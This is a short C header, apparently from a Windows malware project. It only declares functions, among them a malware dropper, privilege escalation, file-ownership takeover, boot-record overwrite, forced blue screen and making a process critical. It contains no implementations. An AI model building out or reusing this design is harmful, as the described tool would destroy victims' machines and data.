#pragma once
#include "capaz.h"

#define NUMERAL_ACES 2

BOOL
WINAPI
ExecuteMalwareDropper(
	VOID
);

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE hToken,
	_In_ PWSTR  szPrivilege
);

BOOL
WINAPI
FileOpener(
	VOID
);

BOOL
WINAPI
TakeOwnership(
	_In_ PWSTR szOwnFile
);

BOOL
WINAPI
OverwriteBoot(
	VOID
);

BOOL
WINAPI
BlueScreen(
	VOID
);

BOOL
WINAPI
SetProcessCritical(
	VOID
);